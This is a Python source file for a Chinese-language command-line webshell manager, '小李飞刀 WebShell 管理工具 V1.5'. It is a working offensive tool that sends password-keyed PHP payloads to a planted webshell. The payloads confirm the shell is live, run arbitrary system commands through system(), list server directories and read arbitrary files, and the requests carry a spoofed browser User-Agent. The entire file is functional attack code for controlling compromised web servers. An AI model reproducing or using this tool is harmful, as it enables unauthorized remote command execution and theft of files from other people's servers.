'''
Author: AdminTony
Date: 2024-08-27 15:55:35
LastEditTime: 2024-08-27 18:13:07
LastEditors: AdminTony
'''

def banner():
    print('''
  __  __ _      ____  _       ____  _____ _  __ 
 |  \/  (_)    |  _ \| |     |  _ \| ____| |/ / 
 | |\/| |___  _| |_) | |     | |_) |  _| | ' /  
 | |  | | \ \/ /  __/| |___  |  __/| |___| . \  
 |_|  |_|  \__/|_|   |_____| |_|   |_____|_|\_\ 

    小 李 飞 刀 WebShell 管 理 工 具 V1.5
''')
    
import argparse
import requests,random
import sys

headers = {
    'User-Agent': 'Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01',
    'Content-Type': 'application/x-www-form-urlencoded'
}

def active_test(url,password):
    random_str = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',8))
    post_data = f'{password}=echo "{random_str}";'
    try:
        resp = requests.post(url,data=post_data,timeout=30,headers=headers)
        if random_str in resp.text:
            print(f'[+] {url},{password} is active!')
            post_data = f'{password}=echo "{random_str}->";echo dirname(__FILE__);echo "<-{random_str}";'
            resp = requests.post(url,data=post_data,timeout=30,headers=headers)
            print('[+] WebShell物理路径：',resp.text.replace(f'{random_str}->','').replace(f'<-{random_str}',''))
            print(f'[+] 你可以使用-p 指定路径查看文件, -f 指定文件查看内容 , -c 执行命令')
            return True
        else:
            print(f'[-] {url},{password} may not active! status_code is {str(resp.status_code)}')
            return False
    except:
        print(f'[-] {url} connect timeout')
        return False

def exec_command(url,password,command):
    random_str = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',8))
    post_data = f'{password}=echo "{random_str}";'
    try:
        resp = requests.post(url,data=post_data,timeout=30,headers=headers)
        if random_str in resp.text:
            print(f'[+] {url},{password} is active!')
            post_data = f'{password}=echo "{random_str}->";echo system("{command}");echo "<-{random_str}";'
            resp = requests.post(url,data=post_data,timeout=30,headers=headers)
            print(f'[+] {command} 命令执行结果：',resp.text.replace(f'{random_str}->','').replace(f'<-{random_str}',''))
            # print(f'[+] 你可以使用-p 指定路径查看文件, -f 指定文件查看内容 , -c 执行命令')
            return True
        else:
            print(f'[-] {url},{password} may not active! status_code is {str(resp.status_code)}')
            return False
    except:
        print(f'[-] {url} connect timeout')
        return False

def get_path(url,password,path):
    random_str = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',8))
    post_data = f'{password}=echo "{random_str}";'
    try:
        resp = requests.post(url,data=post_data,timeout=30,headers=headers)
        if random_str in resp.text:
            print(f'[+] {url},{password} is active!')
            post_data = f'{password}=echo "{random_str}->";foreach(scandir("{path}") as $file) echo $file . "\\n";echo "<-{random_str}";'
            resp = requests.post(url,data=post_data,timeout=30,headers=headers)
            print(f'[+] {path} 目录下有：\n',resp.text.replace(f'{random_str}->','').replace(f'<-{random_str}',''))
            # print(f'[+] 你可以使用-p 指定路径查看文件, -f 指定文件查看内容 , -c 执行命令')
            return True
        else:
            print(f'[-] {url},{password} may not active! status_code is {str(resp.status_code)}')
            return False
    except:
        print(f'[-] {url} connect timeout')
        return False
    
def get_file_contents(url,password,filename):
    random_str = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',8))
    post_data = f'{password}=echo "{random_str}";'
    try:
        resp = requests.post(url,data=post_data,timeout=30,headers=headers)
        if random_str in resp.text:
            print(f'[+] {url},{password} is active!')
            post_data = f'{password}=echo "{random_str}->";echo file_get_contents("{filename}");echo "<-{random_str}";'
            resp = requests.post(url,data=post_data,timeout=30,headers=headers)
            print(f'[+] {filename} 文件的内容为：\n',resp.text.replace(f'{random_str}->','').replace(f'<-{random_str}',''))
            # print(f'[+] 你可以使用-p 指定路径查看文件, -f 指定文件查看内容 , -c 执行命令')
            return True
        else:
            print(f'[-] {url},{password} may not active! status_code is {str(resp.status_code)}')
            return False
    except:
        print(f'[-] {url} connect timeout')
        return False

def main():
    parser = argparse.ArgumentParser(description="小李飞刀管理工具")

    # Add arguments
    parser.add_argument("-u", "--url", type=str, help="输入URL")
    parser.add_argument("-p", "--path", type=str, help="输入路径")
    parser.add_argument("-f", "--filename", type=str, help="输入文件名")
    parser.add_argument("-c", "--command", type=str, help="输入命令")
    parser.add_argument("-pass", "--password", type=str, help="输入命令")
    
    # Parse arguments
    args = parser.parse_args()

    # If no arguments are provided, show help
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    # Print the arguments
    if args.url and  args.password:
        # print(f"URL: {args.url}")
        if (not args.path and not args.filename and not args.command):
            active_test(args.url,args.password)
    else:
        print(f'未输入必填参数url或password')
        sys.exit(1)
    if args.path:
        get_path(args.url,args.password,args.path)
    if args.filename:
        get_file_contents(args.url,args.password,args.filename)
    if args.command:
        exec_command(args.url,args.password,args.command)

if __name__ == "__main__":
    banner()
    main()